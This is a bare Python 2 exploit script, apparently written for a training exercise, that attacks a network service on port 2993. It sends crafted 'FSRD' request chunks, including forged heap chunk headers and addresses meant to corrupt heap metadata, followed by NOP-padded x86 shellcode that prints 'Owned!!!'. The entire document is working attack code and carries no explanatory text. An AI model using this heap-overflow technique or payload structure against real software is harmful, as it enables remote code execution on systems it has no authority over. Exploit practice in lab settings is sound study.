#!/usr/bin/env python
import sys, socket
from struct import pack, unpack
from binascii import hexlify

HOST = sys.argv[1]
PORT = 2993
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
shellcode = "\x90"*(128-len(shellcode)) + shellcode

payload1 = "FSRD" + "A"*(128-5) + "/"
s.sendall(payload1) # first chunk

heapbuf= "\xfe\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x10\xd4\x04\x08" + "\x18\xe1\x04\x08" # current chunk
payload2 = "FSRD" + "ROOT" + "A"*(128-9-len(heapbuf)) + "/" + heapbuf
s.sendall(payload2) # next chunk

# terminate session
s.sendall(shellcode) # shellcode chunk

data = s.recv(1024)
print "%s" % data          # print the confirmation
data = s.recv(1024)
print "%s" % data          # print the confirmation

s.close()
